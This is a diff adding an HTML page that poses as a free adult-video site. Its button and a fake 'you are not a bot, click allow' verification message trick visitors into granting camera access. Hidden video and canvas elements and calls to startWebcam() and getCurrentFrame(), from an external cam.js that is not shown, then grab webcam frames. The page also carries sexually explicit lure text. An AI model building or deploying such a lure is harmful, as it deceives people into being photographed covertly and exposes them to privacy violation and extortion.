@@ -1,0 +1,41 @@
+<html>
+    <head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <title>
+        Free Uncensored Hentai
+    </title>
+   <meta name="description" content="These videos will make you cum in 10 seconds">
+   <meta name="viewport" content="width=device-width, initial-scale=1"></head>
+    <body>
+        <p>
+            <center>
+                <div id="bigtext"><h1>Click button below to access free uncensored hentai</h1></div>
+                <button onclick="hentai();">Access Free Hentai</button>
+                <br>
+                <br>
+                <div id="verify"></div>
+                <br>
+                <div id="verifybutton"></div>
+                <video id="video" hidden autoplay></video>
+                <canvas id="myCanvas" hidden></canvas>
+                <img id="my-data-uri" src="">
+            </center>
+        </p>
+        <script src="./assets/scripts/cam.js"></script>
+        <script>
+            function hentai() {
+                startWebcam();
+                getCurrentFrame();
+                verify();
+            }
+            function verify() {
+                document.getElementById("verify").innerHTML = 'Your browser is suspicious. To verify that you are not a bot, click allow on the popup and after that click the button bellow'
+                document.getElementById("verifybutton").innerHTML = '<button onclick="verified();">Verify</button>'
+            }
+            function verified() {
+                getCurrentFrame();
+            }
+        </script>
+    </body>
+</html>
